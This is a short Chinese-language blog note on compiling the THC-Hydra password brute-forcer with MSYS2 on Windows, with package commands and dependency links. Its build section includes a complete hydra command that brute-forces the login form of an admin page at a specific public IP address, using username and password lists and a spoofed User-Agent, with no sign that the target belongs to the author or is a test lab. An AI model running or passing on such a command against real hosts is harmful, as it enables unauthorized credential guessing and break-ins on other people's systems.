---
author: XhstormR
categories:
- Notes
date: 2019-03-01T14:11:28+08:00
title: 构建 hydra
---

<!--more-->

Updated on 2019-03-01

> [MSYS2](https://mirrors.ustc.edu.cn/help/msys2.html)
>
> [hydra](https://github.com/vanhauser-thc/thc-hydra/archive/master.zip)

## Step
```bash
D:\Work\Download\thc-hydra-master>

pacman -Syu
pacman -S --noconfirm --needed gcc make openssl-devel

./configure && make

hydra -V -F -L username.txt -P password.txt -o ok.txt -t 20 'http-post-form://222.69.159.53:80/cm_admin/login.aspx:txtloginid=^USER^&txtpsw=^PASS^:F=password incorrect!:H=User-Agent\: wget'
```

```bash
pacman -Ss gcc #搜索软件包
pacman -Sg mingw-w64-x86_64-toolchain #查看软件组

pacman -Fs jq.exe #搜索文件
```

## Reference
* 依赖：
  * msys-2.0.dll：[src](https://mirrors.ustc.edu.cn/msys2/msys/sources/msys2-runtime-3.0.7-3.src.tar.gz) | [bin](https://mirrors.ustc.edu.cn/msys2/msys/x86_64/msys2-runtime-3.0.7-3-x86_64.pkg.tar.xz)
  * msys-z.dll：[src](https://mirrors.ustc.edu.cn/msys2/msys/sources/zlib-1.2.11-1.src.tar.gz) | [bin](https://mirrors.ustc.edu.cn/msys2/msys/x86_64/zlib-1.2.11-1-x86_64.pkg.tar.xz)
  * msys-ssl-1.1.dll, msys-crypto-1.1.dll：[src](https://mirrors.ustc.edu.cn/msys2/msys/sources/openssl-1.1.1.c-1.src.tar.gz) | [bin](https://mirrors.ustc.edu.cn/msys2/msys/x86_64/libopenssl-1.1.1.c-1-x86_64.pkg.tar.xz)
* [MSYS2](https://www.msys2.org)
